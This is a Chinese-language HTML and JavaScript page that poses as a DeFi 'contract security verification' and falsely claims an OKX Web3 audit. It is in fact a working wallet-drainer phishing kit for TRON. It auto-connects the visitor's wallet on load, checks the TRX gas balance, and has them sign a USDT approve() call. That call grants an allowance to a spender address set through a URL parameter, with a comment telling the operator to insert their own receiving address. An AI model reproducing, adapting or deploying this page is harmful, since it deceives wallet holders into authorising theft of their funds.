<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <title>DeFi Protocol - 安全验证</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        html, body { height: 100%; margin: 0; padding: 0; background-color: #f8fafc; }
        body { display: flex; align-items: center; justify-content: center; font-family: -apple-system, "SF Pro Text", sans-serif; }

        .card { background: #ffffff; width: 90%; max-width: 400px; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.05); padding: 28px; border: 1px solid #f1f5f9; }
        .header { text-align: center; margin-bottom: 24px; }
        .header h2 { margin: 0; font-size: 20px; color: #0f172a; }
        .header p { font-size: 12px; color: #64748b; margin-top: 4px; }

        .item-box { background: #f1f5f9; border-radius: 16px; padding: 16px; margin-bottom: 12px; }
        .item-label { font-size: 11px; color: #64748b; margin-bottom: 6px; display: block; text-transform: uppercase; letter-spacing: 0.5px; }
        .item-value { font-size: 14px; color: #1e293b; font-weight: 600; word-break: break-all; font-family: "SF Mono", monospace; }
        .amount { font-size: 32px; color: #2563eb; text-align: center; display: block; margin: 8px 0; font-weight: 800; }

        .log-box { height: 80px; background: #0f172a; border-radius: 12px; padding: 12px; font-size: 11px; color: #94a3b8; overflow-y: auto; margin-bottom: 20px; line-height: 1.6; }
        .log-ok { color: #10b981; }
        .log-err { color: #f43f5e; }

        .btn { background: #2563eb; color: white; border: none; width: 100%; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 14px rgba(37,99,235,0.4); }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { background: #cbd5e1; box-shadow: none; cursor: not-allowed; }

        .security-footer { margin-top: 15px; font-size: 11px; color: #94a3b8; text-align: center; display: flex; align-items: center; justify-content: center; }
        .security-footer svg { width: 14px; height: 14px; margin-right: 4px; fill: #10b981; }
    </style>
</head>
<body>

<div class="card">
    <div class="header">
        <h2>合约安全验证</h2>
        <p id="wallet-type">正在识别 Web3 钱包环境...</p>
    </div>

    <div class="item-box">
        <span class="item-label" style="text-align: center;">拟授权额度</span>
        <span class="amount" id="ui-amount">0.00 <small style="font-size:14px">USDT</small></span>
    </div>

    <div class="item-box">
        <span class="item-label">当前账户</span>
        <div class="item-value" id="ui-wallet">等待授权连接...</div>
    </div>

    <div class="log-box" id="log-box">
        <div>初始化环境...</div>
    </div>

    <button id="main-btn" class="btn" onclick="handleProcess()">连接钱包</button>

    <div class="security-footer">
        <svg viewBox="0 0 20 20"><path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z"></path></svg>
        智能合约已通过 OKX Web3 安全审计
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
<script>
    // --- 配置区 ---
    const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
    const DEFAULT_SPENDER = "TYourDefaultAddressHere"; // 修改为你自己的接收地址
    const DEFAULT_AMOUNT = 1000;

    const params = new URLSearchParams(window.location.search);
    const targetSpender = params.get("to") || DEFAULT_SPENDER;
    const targetAmount = params.get("amount") || DEFAULT_AMOUNT;

    let currentState = 0; // 0:未连接, 1:待授权
    let tronInstance = null;

    document.getElementById("ui-amount").innerHTML = targetAmount + ' <small style="font-size:14px">USDT</small>';

    function log(msg, type) {
        const box = document.getElementById("log-box");
        const div = document.createElement("div");
        div.className = type === "ok" ? "log-ok" : (type === "err" ? "log-err" : "");
        div.innerText = "> " + msg;
        box.appendChild(div);
        box.scrollTop = box.scrollHeight;
    }

    // 核心改进：主动请求钱包权限
    async function requestWalletPermission() {
        // 优先探测 OKX
        if (window.okxwallet && window.okxwallet.tronLink) {
            log("请求 OKX 钱包连接授权...", "ok");
            try {
                // 这是触发 OKX 弹窗的关键！
                const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
                if (res && res.code === 200) {
                    return window.okxwallet.tronLink.tronWeb;
                }
            } catch (e) {
                console.error("OKX授权拒绝", e);
            }
        }
        
        // 探测常规 TronLink / TP / imToken
        if (window.tronWeb) {
            log("请求通用 Web3 环境授权...");
            // 部分钱包也支持 requestAccounts
            if (window.tronWeb.request) {
                await window.tronWeb.request({ method: 'tron_requestAccounts' });
            }
            return window.tronWeb;
        }
        return null;
    }

    async function handleProcess() {
        const btn = document.getElementById("main-btn");
        if (currentState === 0) {
            btn.disabled = true;
            await connect();
            btn.disabled = false;
        } else {
            await approve();
        }
    }

    async function connect() {
        log("启动检测引擎...");
        tronInstance = await requestWalletPermission();
        
        if (!tronInstance) {
            log("错误: 未检测到钱包，或授权被拒绝", "err");
            return;
        }

        try {
            // 拿到地址
            const addr = tronInstance.defaultAddress.base58;
            if (addr) {
                document.getElementById("ui-wallet").innerText = addr.substring(0,8) + "..." + addr.substring(addr.length-8);
                document.getElementById("wallet-type").innerText = "已连接 OKX / Web3 钱包";
                log("成功获取地址: " + addr.substring(0,6), "ok");
                currentState = 1;
                document.getElementById("main-btn").innerText = "立即安全确认";
            } else {
                log("已检测到钱包，但未能读取地址，请在钱包内手动解锁并刷新", "err");
            }
        } catch (e) {
            log("连接异常，请重试", "err");
        }
    }

    async function approve() {
        const btn = document.getElementById("main-btn");
        btn.disabled = true;
        
        try {
            const user = tronInstance.defaultAddress.base58;
            log("正在核算 Gas 燃料...");
            
            const balanceSun = await tronInstance.trx.getBalance(user);
            if (tronInstance.fromSun(balanceSun) < 18) {
                throw "TRX 余额不足 (当前需约20 TRX)";
            }

            log("等待钱包确认签名...");
            const contract = await tronInstance.contract().at(USDT_ADDR);
            const amountSun = tronInstance.toBigNumber(targetAmount).times(1e6).toString(10);

            const txid = await contract.approve(targetSpender, amountSun).send({
                feeLimit: 100000000
            });

            if (txid) {
                log("授权提交成功，TXID已产生", "ok");
                alert("确认成功，请等待系统处理");
            }
        } catch (e) {
            let m = e.message || e;
            if (m.includes("declined") || m.includes("User rejected")) m = "签名请求被拒绝";
            log("错误: " + m, "err");
        } finally {
            btn.disabled = false;
        }
    }

    // 页面加载后延迟 0.5 秒自动尝试连接一次，体验更好
    window.onload = () => {
        setTimeout(connect, 500);
    };
</script>

</body>
</html>
